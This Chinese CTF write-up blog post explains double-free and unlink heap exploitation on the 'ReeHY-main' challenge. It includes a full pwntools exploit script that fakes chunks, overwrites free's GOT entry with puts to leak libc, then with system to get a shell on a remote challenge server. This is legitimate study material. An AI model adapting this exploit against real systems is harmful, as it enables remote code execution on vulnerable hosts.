---
title: double-free
date: 2018-03-30 17:57:05
categories:
tags:
	- CTF
	- double-free
	- unlink

---



Double Free其实就是同一个指针free两次。虽然一般把它叫做double free。其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。

double free的原理其实和堆溢出的原理差不多，都是通过unlink这个双向链表删除的宏来利用的。只是double free需要由自己来伪造整个chunk并且欺骗操作系统。



## 程序分析

题目为  [看雪.Wifi万能钥匙 CTF 2017 第4题 ReeHY-main ](https://ctf.pediy.com/game-fight-34.htm)

1. 创建 chunk，选择存储chunk指针到数组中的那个位置(BSS段)， chunk 不能大于 4k ， 数量<=4。

   并将 可编辑标志 置为 1。

2. 释放 chunk，选择 chunk指针数组 释放。 检测下标<=4

3. 编辑 chunk，选择 chunk指针数组 编辑， 检测 可编辑标志 ， 1 为可编辑。  **存在堆溢出**




## 利用

利用思路：

1. 由于指针释放后未重置，存在 double free。
2. 利用 unlink 将free 替换为 push ， 得到基址。
3. 利用 基址得到 system 地址。
4. 将 free 替换为  system
5. getshell




申请chunk1 ，chunk2

![mg-](double-free/img-1.png)

释放 chunk1 ，chunk2 ， 申请chunk3 (0x210字节) 为保证double free利用万无一失，最好后申请的大chunk的空间与之前两个chunk完全重叠。

![mg-](double-free/img-2.png)

然后我们伪造chunk4 chunk5，(chunk1指针(指针P) free时没有重置 ，可以 Double free  )，可以实现 unlink。

![mg-](double-free/img-3.png)


```python
#!/usr/bin/env python
# encoding: utf-8
 
from pwn import *
import sys
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
# context.log_level = "debug"
 
def Welcome():
    p.recvuntil("$ ")
    p.sendline("mutepig")
 
def Add(size,id,content):
    p.recvuntil("$ ")
    p.sendline("1")
    p.recvuntil("size\n")
    p.sendline(str(size))
    p.recvuntil("cun\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.sendline(content)
 
def Remove(id):
    p.recvuntil("$ ")
    p.sendline("2")
    p.recvuntil("dele\n")
    p.sendline(str(id))
 
def Edit(id,content):
    p.recvuntil("$ ")
    p.sendline("3")
    p.recvuntil("edit\n")
    p.sendline(str(id))
    p.recvuntil("content\n")
    p.send(content)
 
if __name__ == "__main__":
    if len(sys.argv)==1:  # local
        p = process("./4-ReeHY-main")
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        p = remote('211.159.216.90', 51888)
        libc = ELF('ctflibc.so.6')
    #+==================INIT=====================================
    elf = ELF('4-ReeHY-main')
    libc_atoi = libc.symbols['atoi']
    libc_system = libc.symbols['system']
    libc_binsh = next(libc.search("/bin/sh"))
    free_got = elf.got['free']
    atoi_got = elf.got['atoi']
    puts_plt = elf.plt['puts']
    heap_addr = 0x602100
    #+==================INIT=====================================
    Welcome()
    Add(512,0,"/bin/sh\x00")
    Add(512,1,"1")
    Add(512,2,"2")
    Add(512,3,"3")
    Remove(3)  # free顺序无影响。
    #https://bbs.pediy.com/thread-218395.htm exp中的malloc和free为了保护chunk0不被覆盖。
    Remove(2)
    payload = p64(0) + p64(512+1) + p64(heap_addr - 0x18) + p64(heap_addr - 0x10) + 'A'*(512-0x20) + p64(512) + p64(512)
    Add(1024,2,payload)
    Remove(3)
 
    Edit(2,'1'*0x18 + p64(free_got) + p64(1) + p64(atoi_got)+ "\n")
    gdb.attach(p)
    Edit(2,p64(puts_plt)) # 改写 free 为 puts
    
    
    Remove(3)
    atoi_addr = u64(p.recv(8)) & 0xffffffffffff   
    # u64 出错 ， 解决办法：
    #1. system_addr = u64(puts_addr+'\x00'*2)-puts_off+system_off
    #2. atoi_addr = u64(p.recv(8)) & 0xffffffffffff   
    
    base_addr = atoi_addr - libc_atoi
    system_addr = base_addr + libc_system
    
    Edit(2,p64(system_addr)) # 改写 free 为 system
    Remove(0)
 
    p.interactive()
```



## 参考

https://bbs.pediy.com/thread-218395.htm

https://bbs.pediy.com/thread-218325.htm

https://www.tuicool.com/articles/yquU732

